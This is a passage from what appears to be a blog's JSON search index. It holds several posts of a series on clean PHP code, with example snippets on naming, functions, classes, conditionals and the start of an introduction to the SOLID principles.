may not necessarily improve efficiency from a computer’s perspective who consumes code, but they reduces headache from a reader’s perspective, we don’t want to favor computers by providing them efficient but hard to understand instructions when your co-workers are the ones you should really care about.   It is true for the coming tips and practices in the following installments, and also true for most design patterns and software development principles, but I would say this is a rather pleasant trade-off of code efficiency for enjoyable reading and efficient collaborating experiences, don’t you agree?  ","categories": [],
        "tags": ["Clean Code","PHP","Programming Guideline"],
        "url": "http://localhost:4000/clean-code-tips-and-tricks-variables/",
        "teaser":null},{
        "title": "Clean Code Tips and Tricks: Functions",
        "excerpt":"Hello fellow geeks, welcome back to the second instalment of Clean Code Tips and Tricks.   In this post we’ll talk about functions, or methods. We’ll discuss some of the specific guidelines for naming functions, and some tips on writing and working with functions.   Function Names   Use Actions and Interrogative Sentences  The same rules apply here as for variable names, but instead of using nouns and general statements to describe variables, we use verbs and questions to name methods.   doSomething();  performSomeAction();  saveSomeData();  filterSomeInput();  validateSomeForm();   Interrogative sentences clearly states the intent of the function – to answer a specific question.   isUserActive();  isCustomerAdult();  shouldSendEmailAgain();  hasFailedAnyExam();   Be Descriptive   Similar to variable names, be sure to describe your intention well and wholly.   getCount();  // More descriptive getDailyVisitors();  // And fully describe the nature getAverageDailyVisitors();   Method names do look longer this way, but it helps your readers to figure out the usage of these methods without even looking at their definitions.   However if a method name become too long, you may have given it more than one thing to do, then it’s advisable to break that function into smaller ones. We’ll talk about this in detail later.   Contrary to variable names, which the lengths of their names are proportionate to the scope they live in, the lengths of method names should be disproportionate to its scope.   A function that is widely used throughout the system indicates that it is general and performs a certain task that is common in many aspects of the software, hence it’s name should be generalized and short. And a function with a smaller scope (i.e. a private function) shows that it’s usage are specific in limited scenarios, you should name it longer with details to reflect it’s specifications.   Examples   These are quiz designed for my team to practice naming methods, I’ll list some of them here as examples.   Some examples are filtered ‘cause they were only there to examine my team’s ability to properly name methods in English.   //Get a particular user's email address. getUserEmailAddress($user_id);  //or to make it read more like natural language getEmailAddressOfUser($user_id);   // Get number of users in a group getGroupUserCount($group_id);  getUserCountInGroup($group_id);   // Update customer's defalut shipping address updateDefaultAddress($new_address);  setDefaultAddress($new_address);  // If the customer entity has another property // with a similar name, e.g. defaultPostalAddress // then it's better to avoid ambiguity by updateDefaultShippingAddress($new_shipping_address);  setDefaultPostalAddress($new_postal_address);  // If they are customer entity's methods, // I would personally not include 'customer' in // method names since they will always be called // with a Customer instance. $customer-&gt;updateDefaultShippingAddress($new_shipping_address);  $customer-&gt;setCustomerDefaultPostalAddress($new_shipping_address);   // Update a given user's active status activateUser($user_id); disableUser($user_id);  // Or with one function $user-&gt;toggleActiveStatus(); toggleUserActiveStatus($user_id); toggleActiveStatusForUser($user_id);   // Is there any order placed by a user in the last month $user-&gt;hasPlacedAnyOrderLastMonth();  didUserPlaceAnyOrderLastMonth($user_id);  // Check if the email has been sent successfully $email-&gt;hasSuccessfullySent();  didEmailSendSuccessfully($email_id);  // Is it necessary to send the notification again $notification-&gt;shouldSendAgain();  shouldSendNotificationAgain($notification_id);  // Check if admin has the permission to perform an action $admin-&gt;canPerform($action_id);  adminHasPermissionTo($admin_id, $action_id);  $admin-&gt;isAuthorizedTo($action_id);   Name Functions Accurately   // If your method name suggests it does one thing, // Don't make it do something else.  public function calculateStudentAverageScore(Student $student) {     return array_sum($student-&gt;subjects-&gt;scores); }   In the example above, we are returning the total score instead of the average score. It happens more often than you think it would, some developers name their method one thing and simply change their mind about it’s purpose as they implement it. Some are casued by someone modifying an existing method six months later but misunderstood it’s intention. It is extremely confusing especially when the method is bloated and complicated. What if someone new joins the team and uses the method incorrectly to generate the report card?      Your average score is 692 points? I always knew my son would one day become a doctor! ~ An excited Asian mom    And no, it’s not racist when I say it. ;-D   A Function Should Only Do One Thing   You’ve probably heard this popular phrase, A function should do one thing, it should do it well, and it should do it only.   Think about toy blocks, they are simple in shapes and when stacked properly together, you can build tons of different types of buildings with them. But if their shapes become too complex and start serving more than one purposes, they become specific, and hard to work with, limiting your ability to be versatile, and increasing your chance of making mistakes.   What Could Possibly Go Wrong?   Take a look at the following example, let’s say that the initial intent of the function was to calculate subtotal of a given list of products, and then a new feature request came in to send that invoice to users, instead of putting that abstraction into a separate function, someone lazy just put it here without refactoring the name of the function.   public function calculateSubtotal($productList) {     $subtotal = 0;     foreach ($productList as $product) {         $subtotal += $product-&gt;price * $product-&gt;quantity;     }      EmailService::sendInvoice($user_id, $subtotal);      return $subtotal; }   Now we end up emailing invoice in a method that is supposed to only calculate the subtotal. Such code pollutes the codebase and is very hard to maintain. What if you are asked to do your boss’s dirty deeds by helping his buddy faking sales record in your multi-tenant ecommerce system, and now random users are getting invoices for products they never purchased? (FYI, a true story)   The last example illustrates a function that contains a misplaced business logic, however there are cases with more subtle problems – these functions contain a set of abstractions that are tightly related but of different levels. See the example code below.   // Note that for the purpose of illustration, the following // code was written in a simplified way. It has more problems // other than just violating the 'one thing rule'. class Subject {     public function enrollStudent(Student $student) {         if ($student-&gt;hasOutstandingInvoice()) {             throw new studentHasOutstandingInvoiceException();         }          if (in_array($student, $this-&gt;listStudents())) {             throw new studentAlreadyEnrolledException();         }          if (count($this-&gt;students) &gt;= 200) {             throw new studentNumberExceededException();         }          $studentScheduledForExam = false;         foreach($this-&gt;preliminaryExams as $examSchedule) {             if (count($examSchedule['attendees']) &lt;= 50) {                 $examSchedule['attendees'][] = $student;                 $studentScheduledForExam = true;                 break;             }         }          if (!$studentScheduledForExam) {             throw new NoValidPreliminaryExamScheduleException();         }          $this-&gt;students[] = $student;          return $this;     } }   The above code performs a set of closely related actions, it checks if the student has any outstanding bills to pay, prevents repetitive enrollment and ensures that there would be no more than 200 students in the classroom. It then tries to schedule the student for one of the preliminary exam schedules. And finally it adds the student to the subject’s student list and returns itself.   This looks reasonable. Many would claim that those validations and preliminary exam scheduling are inseparable parts of the business process of enrolling the student to a class, thus it should be considered as doing one thing.   Unfortunately although these steps are indeed part of the business logic, but it is also true that the function does more than one thing. To understand why, we have to discuss what exactly one thing means.   Defining One Thing   There are some handy ways to determine if your function is doing only one thing. Let’s try to discuss and follow these tips and make our function a one thing function first, and then we’ll discuss what benefits it brings us which would then answers the question of why should we do this in the first place.      A one thing function should have one level of indentation.    Our enrollStudent() function clearly has more than that, look at the part where we check and schedule preliminary exams. A function with multiple levels of indentation indicates that it has multiple levels of implementations of abstractions. In other words, the execution of the steps is not linear.   We all hate a big lengthy function with multiple levels of indentation that the edge of the function looks like – as Martin puts it – a ragged saw. See which of the following two functions seems easier to understand and work with.   public function doSomethingA() {     doSomethingFirst();     checkSomeOtherThing();      doIt(); }  public function doSomethingB() {     if (someConditions) {         if (tryToDoThis) {             doSomethingFirst;         } else {             foreach(things as thing) {                 doSomeOtherThingWith(thing);             }         }          doTheActualThing;     } }      A one thing function should work with one level of abstraction    It’s easy to spot that doSomethingB() function in the last example checks some conditions and loops a list to do some other actions with some other things before it finally does the actual thing we intended it to do the very last. This is an example of performing action at multiple levels of abstraction.   authenticateUser() is at a level of abstraction which is different than persistUserCookie(), and renderHtmlReportCard(). It’s like concating some strings and save it to a log file and then inform a lecturer about an exam schedule change – they work at different levels of the system, one is lower and deals with logging and data persistent and the other is performing a high level business logic – they should work together, but not be placed in the same function.      A one thing function should be extracted from until you can’t anymore    We keep extracting things that are not related to performing the actual thing from the function and put them into separate functions until we reach a point where no more code can be extracted from it meaningfully.   If we try this with our enrollStudent() function, it’ll become this,   class Subject {     public function enrollStudent(Student $student) {          $this-&gt;guardAgainstOutstandingInvoice($student);          $this-&gt;guardAgainstRepetitiveEnrollment($student);          $this-&gt;guardAgainstExcessiveStudent($student);          $this-&gt;schedulePreliminaryExam($student);          $this-&gt;students[] = $student;          return $this;     }      private function guardAgainstOutstandingInvoice($student) {         if ($student-&gt;hasOutstandingInvoice()) {             throw new studentHasOutstandingInvoiceException();         }     }      private function guardAgainstRepetitiveEnrollment($student) {         if (in_array($student, $this-&gt;listStudents())) {             throw new studentAlreadyEnrolledException();         }     }      private function guardAgainstExcessiveStudent($student) {         if (count($this-&gt;students) &gt;= 200) {             throw new studentNumberExceededException();         }     }      private function schedulePreliminaryExam($student) {         $examSchedule = $this-&gt;findFirstAvailableExamSchedule();          if (!$examSchedule)             throw new NoValidPreliminaryExamScheduleException();          $examSchedule['attendees'][] = $student;     }      private function findFirstAvailableExamSchedule() {         foreach($this-&gt;preliminaryExams as $examSchedule) {             if (count($examSchedule['attendees']) &lt;= 50) {                 return $examSchedule;             }         }          return false;     } }   We can see that by extracting excessive code from the function and put them into separate functions respectively, we end up with only 6 lines of code that except for all the function calls, does only one thing – enroll the student.   Each of the guard functions performs their own validation and we even split preliminary exam scheduling code into two functions, one in charge of finding an available schedule slot, the other dedicates in the actual scheduling.   By applying the three rules we discussed about to each of every function in this example, you’ll find that they all have one level of indentation, they work under the same level of abstraction within themselves, and we practically cannot extract anything meaningful from any of them anymore.   Now we can say our functions comply the one thing rule, but what good does this do?   Was That Really Necessary?   The most obvious change was the reduction of the length of our enrollStudent() function. You may think it’s cheating because all we did was to put those lines of code into other functions. That is true, however we did successfully reduced the length of the original function and now every function in that class is short and clean.   Would you rather work with one gigantic function, or a dozen of well organized smaller ones each does exact one thing at a time? Our brains are not good at following up complex systems and tracking down complicated logics, by decomposing a large concept into smaller pieces each containing highly cohesive set of steps, we ease the difficulty of understanding and maintaining the code, which is once again, the main purpose of Clean Code.   By reorganizing excessive code into other functions and having our original function call them, we encapsulated details of other levels of implementation into other functions. This allows our readers to get a brief idea by a quick glance at the short function, they may then choose the follow these function calls that interest them to read the details, or they could ignore all the boring details and just focus on what this function does.   Another added advantage is that by creating more functions, which is a byproduct of the extraction process, we end up with more names. And if we follow the advise on naming your functions properly, these names would serve as documentation to your code, they help us to understand the intention of the code, it’s almost like putting labels on your drawers that keeps your socks and underwear separately.   Even if an excessive piece of code would only be executed along with a business logic, it should be split into a different function, you never know if a new feature request in the future would required that same functionality from a different business process. This improves code reusability.   Function Parameters   Now let’s talk about an important part of a function’s signature, its required parameters.   No More Than 3   A function should really have no more than 3 parameters. A function with 2 parameters each one is of boolean type would already yield a total of 4 possible combinations, imagine a function with 7 mix-typed parameters.   public function registerStudent($firstname, $lastname, $dob, $major,     $secondary_major, $fatherdob, $motherdob, $address) {     ... }  registerStudent('James', 'Bond', 'Computer Science', 'Network Security', '1990-01-01', '1966-02-02', '1970-03-03', '1-1-1, Broad Avenue');   Look at this function with a messy signature like this, it would be really confusing when we invoke the function call. What are these dates for? What is the correct order?   When you encounter a function with more than 3 parameters, check if it follows the one thing rule first, there’s a good chance it’s receiving too many parameters because it’s trying to do multiple things. If that’s not the case, use a value object to pass the data around, or at least utilize array to aggregate parameters.   public function registerStudent($student) {     ... }  registerStudent([     'firstname'=&gt; 'James',     'lastname' =&gt; 'Bond',     'dob' =&gt; '1990-01-01',     'major' =&gt; 'Computer Science',     'secondary_major' =&gt; 'Network Security',     'fatherdob' =&gt; '1966-02-02',     'motherdob' =&gt; '1970-03-03',     'address' =&gt; '1-1-1, Broad Avenue', ]);   Avoid Boolean Switches   That’s right, hash tag noboolean, we should avoid using parameter switches. A parameter switch is a parameter, often boolean in a function that is used for conditional switches.   public function printStudentReport($student, $gpa = false) {     if ($gpa) {         // Convert results into gpa scoring system     } else {         // Use normal scoring system     } }   Print a student’s academic report is the one thing this function was intended to do, but whether to use GPA scoring schema or a regular 100 scoring schema should not be part of it’s logic, it should be up to the higher level of the business flow to decide what it wants.   public function printStudentReportWithNormalSchema($student) {} public function printStudentReportWithGPASchema($student) {}   Now the calling party can freely decide what behavior they expect and invoke corresponding calls accordingly.   public function printStudentReport($student, $gpa = false) {     if ($gpa) {         // Convert results into gpa scoring system     } else {         // Use normal scoring system     }      if ($student-&gt;isFinalYear()) {         // Append final class result     } }   Note that whether the student is a final year student and choose whether or not to append the final class result in the report is indeed part of the printing logic. However it works at a different abstraction level and should be extracted out, now combine these together we get the following functions.   public function printStudentReportWithNormalSchema($student) {     $this-&gt;appendFinalClassResultIfApplicable($student);      // Do the actual printing. }  public function printStudentReportWithGPASchema($student) {     $this-&gt;appendFinalClassResultIfApplicable($student);      // Do the actual printing. }  private function appendFinalClassResultIfApplicable($student) {     if (!$student-&gt;isFinalYear())         return;      // Append final class result }   Alrighty, this is it folks. We’ve talked about naming functions, the one thing rule and some other handy tips and guidelines when working with functions. I hope you like it and see you in the next installment.  ","categories": [],
        "tags": ["Clean Code","PHP","Programming Guideline"],
        "url": "http://localhost:4000/clean-code-tips-and-tricks-functions/",
        "teaser":null},{
        "title": "Clean Code Tips and Tricks: Classes",
        "excerpt":"Welcome back to yet another post on Clean Code Tips and Tricks. We’ve covered variables and functions so far, be sure to check these posts out first if you haven’t.   Naming Classes   We’ve covered tips and guidelines on naming variables and functions, many of the rules should apply to classes as well, keep in mind that naming things properly is like documenting our codebase and provide valuable information to your readers.   Use Noun   A class is an abstraction of an entity with a collection of behaviors that can be instantiated into objects, thus class names should be nouns, not verbs, not any kind of statements.   // These are all silly class names that make no sense at all. class moveStudent {} class shouldSendEmail {} class LogShouldArchive {} class Swim {} class Jump {}   Be Reflective   Reflect the domain this class lives in or the architectural design your team adopts. Stick with some conventions instead of inventing your own terms to avoid confusions.   // Reflect the terms when you use factory or repository pattern class UserFactory {} class CouponRepository {}   Be Verbose   Not quite like variables and functions, we verbosely name our classes for some other reasons. One being each class represents an abstraction of entity, and sometimes the same entity may evolve and become conceptually two entities and should be abstracted into two classes. Naming them verbosely and reflect their differences helps avoiding ambiguity.   The length a class name should have follows the same rule as functions do. The more the class is used throughout the system, meaning the wider the scope it lives in, the shorter and more concise it’s name should be. And of course, the narrower the scope, the longer and more specific you should name them.   Tell Don’t Ask   Tell don’t ask is a well known principle that helps us to bundle data and behaviors together rather than separating them. If we don’t combine data and actions together, we risk breaking encapsulation which is one of the core value of object oriented programming.   class Wallet {     private $customer;     private $balance;      public function __construct(Customer $customer, $balance = 0)         $this-&gt;customer = $customer;         $this-&gt;balance = $balance;     }      public function getBalance() {         return $this-&gt;balance;     }      public function setBalance($value) {         return $this-&gt;balance = $value;     } }   Take a look at this very simple Wallet class, it has some properties, a straightforward constructor and a setter and a getter. Let’s discuss what we can do to make it better.   Don’t Use Setters   A class consists of properties and behaviors, if we overlook it’s behaviors and instead changing it’s properties directly outside the class, we practically took the business logic away from the class.   With a setter like setBalance(), the use case would contain too much business logic that actually belongs to Wallet class. Look at the example code below,   class Order {     public function process() {         // Validate order...         // Calculate subtotal...          // Deduct balance         $wallet = $this-&gt;customer-&gt;wallet;         $balance = $wallet-&gt;getBalance();         if ($balance &lt; $subtotal) {             throw new insufficientBalanceException();         }          $wallet-&gt;setBalance($balance - $subtotal);     } }   Checking if the wallet has sufficient balance and deduct from it should be a business logic belonging to Wallet class, and the order process function is clearly doing more than it should. Let’s revise it to properly encapsulate business logic.   class Wallet {     ...      public function deductBalance($value) {         if ($this-&gt;balance &lt; $value) {             throw new insufficientBalanceException();         }          return $this-&gt;balance -= $value;     }      public function addBalance($value) {         return $this-&gt;balance += value;     }      ... }    We moved the sufficient balance checking and exception throwing back to Wallet class and named the function deductBalance to reflect it’s business logic. We also added a new function called addBalance for use cases that adds fund to a customer’s wallet. Their names can be further improved according to the domain language of this project, for example, deductFee($amount) and refund($amount). It is even advisable to have another setter function exactly same as refund($amount) but named as deposit($amount) to separate two different use cases if that’s what the business process requires.   By doing this, we made sure that a state of an object should never be changed without business logic, now there’s no way of changing the wallet balance without invoking strictly defined business logics.   Even a simple setter such as setLastActivity($datetime) that only receives the value and changes the state, should not be named as a setter but also to reflect the business logic it implies.   Try to Avoid Getters   Not all getters are evil. We should try to write less getters because we often abuse them by providing a way to leak data outside the class and perform business logics with them. And again, those logics should be bond to the states and stay inside the class to achieve encapsulation.   Let’s say we are celebrating 10-year anniversary of our ecommerce system, and anyone with a floor-rounded balance of 2003 – our founding year, will get a 50% off coupon. The code is shown below,   /*  * The marketing team said this would encourage them  * to topup, or spend more depending on how thick their  * wallets are.  */ public function grantAnniversaryCoupon() {     foreach($customers as $customer) {         $balance = $customer-&gt;wallet-&gt;getBanlance();         $floor_balance = floor($balance);          if ($floor_balance === 2003) {             // Grant coupon.         }     } }   Now the problem is that checking if the floor-rounded value of a customer’s wallet equals to 2003 and perform business logics accordingly is grantAnniversaryCoupon() function’s logic, but getting the actual floor-rounded value of your wallet balance is strictly a wallet’s own business, no one else’s.   class Wallet {     ...      public function getBalance() {         return $this-&gt;balance;     }      public function getFloorRoundedBalance() {         return floor($this-&gt;balance);     }      ... }  public function grantAnniversaryCoupon() {     foreach($customers as $customer) {         if ($customer-&gt;wallet-&gt;getFloorRoundedBalance() === 2003) {             // Grant coupon.         }     } }   Eradicating getters is not the point here, but rather to guard against leaking a class’s own logic to the outside by blindly giving out getters.   Handle Static Methods With Care   Static methods are available in many object oriented languages, they come in handy when we want to invoke a function call without instantiating the class that contains the behavior. However, misusing static methods can lead to bugs that are tricky to track down.   // This should work perfectly Calculator::sum(2, 3);  // This is bad. Counter::increase(1);   The main difference between the two static methods is that the first one is stateless and the second is stateful. Stateless means that the Calculator does not remember anything, it simply performs the calculation and returns the result. You can run it for as many times as you like, and in as many context as you like, the results remain the same.   On the other hand, a stateful static function is bad because it stores information from each execution, and the results differs according to how many times you run it, or where you run it. It is equivalent to sharing the same global variable, now two pieces of code using the counter simultaneously would get unreasonable results from their point of view.   A Little Help For Value Objects   Value objects, unlike entities, their equity depends on if all their states are of the same value. It is quite a common requirement to determine equity of two value objects.   class StreetAddress {     private $street;     private $city;      public function __construct($street, $city) {         $this-&gt;street = $street;         $this-&gt;city = $city;     }      public function equals(StreetAddress $streetAddress) {         return $this-&gt;street === $streetAddress-&gt;street &amp;&amp; $this-&gt;city === $streetAddress-&gt;city;     } }  $streetAddress1-&gt;equals($streetAddress2);   By adding this help function to our value object class, we now have a convenient way of examining the equity of two instances of it. We also ensured encapsulation here by locking the logic of comparison inside the class itself other than calling getters and do it manually outside the class. If StreetAddress ever gets a new property, we only have one line of code to update without breaking any other existing code.   Replace Conditional Switches With Inheritance   We talked about why and how we should get rid of parameter switches from function signatures, they serve as a conditional switch to alter the behavior of the function. Having parameter switches suggests that there are multiple variants of the function, and they should be extracted out into specialized ones.   The same thing applies to classes. When you observe a class performing actions according to a conditional switch, it is a good sign that the class should be broken into sub classes extending the original one.   class Faculty {     private $fullname;     private $title;      public function __construct($fullname, $title) {         $this-&gt;fullname = $fullname;         $this-&gt;title = $title;     }      public function markAssignment() {         // All faculty members can mark assignments.     }      public function printJobDescription() {         switch ($this-&gt;title) {             case 'Professor':                 echo 'I teach classes';                 break;             case 'Associate Professor':                 echo 'I teach classes and invigilate exams';                 break;             case 'Teaching Assistant':                 echo 'I conduct tutorials and invigilate exams';                 break             default:                 throw new InvalidTitleException();         }     } }   Take a look at the example above. It is clear that the business logic requires professors and associate professors but teaching assistant to teach classes, associate professors and teaching assistant but professors to invigilate exams, and finally only teaching assistant can conduct tutorials.   The reason someone abstracted these faculty roles into a single class might be that they share lots of properties and behaviors, for example, getSalary(), getYearlyBonus(), calculatePerformanceIndex() and so on. However it is also true that each of them have their own specializations. Having to use switch conditionals to differentiate objects is a clear sign that the class is not following the Single Responsibility Principle, more on that in a later series.   abstract class Faculty {     private $fullname;     private $title;      public function markAssignment() {         // Mark the assignment.     }      abstract public function printJobDescription(); }  class Professor extends Faculty {     public function printJobDescription() {         echo 'I teach classes';     } }  class AssociateProfessor extends Faculty {     public function printJobDescription() {         echo 'I teach classes and invigilate exams';     } }  class TeachingAssistant extends Faculty {     public function printJobDescritption() {         echo 'I conduct tutorials and invigilate exams';     } }   Now we have three clearly defined subclasses each has their own specializations, we won’t have trouble extending these subclasses, or even add a new faculty role in the future. Polymorphism and inheritance are for specialization, and we should always favor them over conditionals.   This is the end of our discussion on Clean Code Tips and Tricks: Classes. I hope you like it and see you in the final installment.  ","categories": [],
        "tags": ["Clean Code","PHP","Programming Guideline"],
        "url": "http://localhost:4000/clean-code-tips-and-tricks-classes/",
        "teaser":null},{
        "title": "Clean Code Tips and Tricks: General Guidelines",
        "excerpt":"Welcome back fellow computer witches and wizards, let’s get back to where we left on Clean Code Tips and Tricks. This will the be the last installment, we’ll talk about some general guidelines and tips to write better code.   One Arrow(Dot) Per Line   Use linebreaks to make your code easier to read. You may want to follow a different way to break your dots or arrows, it’s okay as long as it make your code easier to understand.   // Not so good $this-&gt;setupConfigs()-&gt;registerProvider()-&gt;loadViews()-&gt;listenForLogout();  // Looks better $this-&gt;setupConfigs()      -&gt;registerProvider()      -&gt;loadViews()      -&gt;listenForLogout();  return $this-&gt;project-&gt;deployments()-&gt;where('status', 'Available')-&gt;orderBy('updated_at', 'DESC')-&gt;get();  // Different styles are okay, too return $this-&gt;project-&gt;deployments()             -&gt;where('status', 'Available')             -&gt;orderBy('updated_at', 'DESC')             -&gt;get();   Don’t only make your dots or arrows neat and tidy, try to beautify everything you come across, the main idea is to make your codebase easier on the eyes and more pleasant to work with.   Clean Up IF Statements   Nobody likes nested-IF statements, they increase the number of indentations inside a function, which we discussed about in Clean Code Tips and Tricks: Functions. After extracting excessive code and put them into other functions, we sometimes still have nested-IF statements left. Let’s talk about how to get rid of them, and what are the benefits.   public function runCommands(array $commands) {     if ($this-&gt;isEnabled) {         foreach ($commands as $command) {             $command-&gt;run();         }     } }  // We can reduce levels of indentation by returning early public function runCommands(array $commands) {     if (!$this-&gt;isEnabled) {         return;     }      foreach ($commands as $command) {         $command-&gt;run();     } }  The last example showed how to reduce levels of indentation by returning early, it’s a common method used to clean up if statements, we always want to do the most expected thing lastly.   By doing this, we can eradicate else statements, the structure of the if block looks clearer and easier to read, and performing the most common or most expected behavior at the end of the code block matches how our mind works.   public function getStatusAttribute() {     if (!$this-&gt;isDeployed) {         $status = 'Undeployed';     } elseif ($this-&gt;deployment-&gt;status === 'Active') {         $status = 'Running';     } else {         $status = $this-&gt;deployment-&gt;status;     }      return $status; }  /*  * The above code is at best 'confusing'.  * When there are lots of ifs and elseifs,  * we are prone to make logic errors which lead to bugs,  * and it's hard to understand what this piece  * of code is actually trying to achieve.  *  * Let's try to eradicate elseif and else statements.  */  public function getStatusAttribute() {     if (!$this-&gt;isDeployed) {         return 'Undeployed';     }      if ($this-&gt;deployment-&gt;status === 'Active') {         return 'Running';     }      return $this-&gt;deployment-&gt;status; }   Much better, right? Keep in mind that the  key is to identify what is the most expected behavior.   public function uploadAvatar($avatar) {      if (!isset($avatar)) {          if ($this-&gt;isDisabled() === false) {              if (in_array($avatar-&gt;fileExtension, $allowedFileExtensions)) {                  $this-&gt;avatar = $avatar;                  $this-&gt;save();                   return true;              } else {                  throw new FileExtensionNotAllowedException();              }          } else {              throw new UserIsDisabledException();          }      } else {         throw new UserAlreadyHasAvatar();      }     /*      * As the name of the method suggests,      * We are setting user's avatar, so the      * most expected behavior is, well, set      * the avatar. Other branches may be      * file extension unmatch, or user already      * have an avatar, or the user is disabled.      *      * To refactor the above code, we just move      * the most expected behavior to the last.      */       if (isset($avatar)) {          throw new UserAlreadyHasAvatar();      }       if ($this-&gt;isDisabled()) {          throw new UserIsDisabled();      }       if (!in_array($avatar-&gt;fileExtension, $allowedFileExtensions)) {          throw new FileExtensionNotAllowed();      }       $this-&gt;avatar = $avatar;      $this-&gt;save();       return true; }   Doesn’t it look much more straightforward after we refactored it? Think about what is the actual thing or the most expected behavior of the function you are writing and put it at the end first, then think about what are the conditions or exceptions when this behavior should not be executed, write them down above and return early. This way you’ll always end up with much cleaner looking conditionals.   Don’t Comment   This is an exaggeration. Comments are sometimes necessary, but we are overdoing it.   /*  * Dear fellow co-workers:  * I consulted with our marketing team, they said the client  * must have more than 100 orders in total, but Bob said there's  * a bug in the CouponService so we have to check if the user has  * too many coupons to handle. Then Joe talked with the boss and  * confirmed that this should not include inactive clients.  *  * Hope that clears it up. Feel free to ask me questions.  */ if ($client-&gt;getTotalOrders() &gt; 100 &amp;&amp; $client-&gt;getCouponCount() &lt;= 10 &amp;&amp; $client-&gt;inActive() {     return $client-&gt;id; }   Oh, how nice of you to leave such a thoughtful comment to your co-workers, but unfortunately it’s not the best practice.      “Comments are often lies waiting to happen.”    Think about this, what if the marketing team later changed their minds? What if Bob fixed the bug in CouponService? What if Joe got it all wrong and the boss meant something different?   They are not lies when you write them down, yet. But they will eventually become lies if given time. That’s not the real problem yet, wait when someone comes back to reflect Bob’s bug fix here and forgot to change your comments and a new guy joins the team believing that the bug never got fixed by reading your comment.   By writting comments like this, you are adding extra stuff to maintain, and you risk misleading yourself and your co-workers. Write comments only when it’s definitely necessary.   Get Rid of Zombie Code   Zombie code are code blocks that are commented for some reason, and that reason may have been forgotten by the person who did it. They are normally useless, and often there for a very long time, thus not up to date with the newest codebase. They disturbs code reading, uglifies our codebase, and worst of all, they may accidentally come back to life.      “Wow, look what I found? I think this commented method is definitely going to work perfectly. I wonder who did this to such wonderful and elegant code.”    Get rid of them by following these steps:     Comment out temporarily unwanted code block   Put a comment there stating the current date   If you find a commented code block without a date, add current date   If you find a commented code block that is more than 30 days old, delete it   Don’t worry, I’ve never heard anyone complaining,      “Oh damnation! Who deleted my commented code? I knew it would one day become useful, and I was right! Now it fits perfectly with our codebase but I have to write it again!    Says no one, ever.   No God Classes   God classes have too many responsibilities, they are usually bloated and large in size, they are monolitic and knows too much about business logics that don’t belong to them, and they are usually tightly coupled with other classes. We’ll discuss about S.O.L.I.D principle in a later series, god classes can be identified and dealt with by following Single Responsibility Principle. I’ll leave that for later discussion, but let me first introduce you a way to identify a god class.   // Look for name prefixes in function signatures class DataFileProcessor {     public function splitFileByLineCount();     public function splitFileByByte();     public function splitFileByKeyword();      public function processSalesData();     public function processProductsData();     public function processImages(); }   You may have guessed, even though these functions look like they all process the data files, thus should be in DataFileProcessor, but the fact they are grouped with name prefixes tells us a different story. If we were to name the class properly to reflect all it’s attributes, it should be called DataFileSplitterAndProcessor.   Whenever you see a class with AND in it’s name, or it’s member functions are clearly categorize-able by looking at their prefixes, you know that the class is having multiple responsibilities and should be refactored. The above class should be divided into DataFileSplitter and DataFileProcessor.   Conclusion   Whew, what a journey. This is the end of our five-installment Clean Code Tips and Tricks, I hope you enjoyed it as much as I enjoyed preparing it.   We talked about the importance of writing readable code that’ll make you and your co-workers understand better and enjoy working with. And we discussed many tips and tricks to achieve clean code.   I have to admit that there are limitations such as some of the tips are purely from my personal experience thus biased with my personal preferences, some examples in PHP can’t represent all other OOP languages, and I couldn’t possibly cover everything there’s to know about clean code. Despite all these, the one take away I hope you get is that We need to spend more time writing good quality code, and less time reading bad ones.   I plan to write more about design patterns in the comming weeks, please stay tuned if you are interested, however be informed they won’t be introductions or tutorials as you can find better sources online and in books, it’ll be just me sharing my opinions and experiences with these that I’ve personal had experiences with.   Have a nice day and see you soon.  ","categories": [],
        "tags": ["Clean Code","PHP","Programming Guideline"],
        "url": "http://localhost:4000/clean-code-tips-and-tricks-general-guidelines/",
        "teaser":null},{
        "title": "Software Design Principles - That Looks S.O.L.I.D",
        "excerpt":"This is the first post on Software Design Principles, I plan to cover all the Design Principles that I’ve had personal experiences with, so that this series will not be and should not be used as tutorials or introductions to those principles for that I’ll mostly be approaching them based on my personal (and very likely biased) opinions and experiences. However, I’ll try to give a brief introduction to each concept as I go. Please consider reading about these principles from myriad good sources online before you read my posts.   Design Principles, differ from Design Patterns, are generalized high level software design guidelines and rules of thumbs for us to approach some of the common design problems, they focus on conceptual designs, not the actual implementation. On the other hand, Design Patterns focus on low level implementation by providing reusable solutions to common programming problems.   For example, the Design Principle we are going to discuss today, S.O.L.I.D, states some high level guidelines we should keep in mind when creating a class or designing a member function, while Design Patterns such as the singleton pattern, provides detailed steps to follow in order to create classes that can only be instantiated once.   To be frank, I have the ambition to cover all Design Principles, Design Patterns, Development Methodologies such as Extreme Programming, Architectural Patterns like CQRS or MVC, and Development Philosophies like Agile Software Development and Domain Driven Development. I don’t know if I’ll have the time and energy to do all these, but since I like making plans and to plan far ahead, I’m actually approaching all these topics with an order.   And it’s a descending order by the relative effectiveness in improving a development team’s code quality. For example, we talked about Clean Code in our five-installment series Clean Code Tips and Tricks first because I think it is the most effective, almost all of the teams I worked with showed improvements in code quality in a matter of weeks. And more importantly, it’s general, it can be and should be adopted by every development team. Architectural Patterns on the other hand, are great, like MVC and it’s variants, and are widely adopted by development teams, but the problem is that teams adopt different Architectural Patterns thus they are more of a subjective topic and are less general.   I’m approaching these topics in this way in hope that even if I couldn’t find the time or energy to cover everything, my posts would’ve already been beneficial to my readers.   S.O.L.I.D Principle   If you’ve read my blog series on Clean Code, which I recommend you do if you haven’t, we talked about why and how we should focus on writing code that are easy on the eyes and enjoyable to work with by following some tips and guidelines. Such a great way to improve your code quality in a short period of time is often underrated and not getting enough attention. I think Clean Code should be adopted by every development team and programmer to start writing clean, beautiful, and elegant code.   Now let’s move on to S.O.L.I.D principle. The reason that I chose to discuss S.O.L.I.D first before all the other software design principles is that I think it is the most effective in terms of improving maintainability, reusability, and extensibility of your codebase. I think it is also the most fundamental principle that is so influential that it is now standard, a default principle which I think, again, should be adopted by every development team as long as you work with an Object Oriented Programming Language.   Single Responsibility Principle      A class should have one, and only one, reason to change. ~ Uncle Bob in his Priciples of OOD    A class should focus on a single set of cohesive tasks.   By cohesive, it means the member functions are highly interdependent and interconnected, they work together to define the characteristic of the class.   Cohesion also means collaboration. Think about development teams in an IT company, you don’t often come across a front-end developer in a database team, or a marketing person in a backend team who attends every sprint meeting. You are a unit who does something well, and you team works together to do something bigger well, and your whole development department collaborates together to deliver a really complex system, then all the departments in your company strive to make the business profitable.   It’s exactly the same thing in writing source code, every line of code in a method works together to define the method, every method in a class serves their purpose and create sense for the class, every class in a module fit together to form a module, and 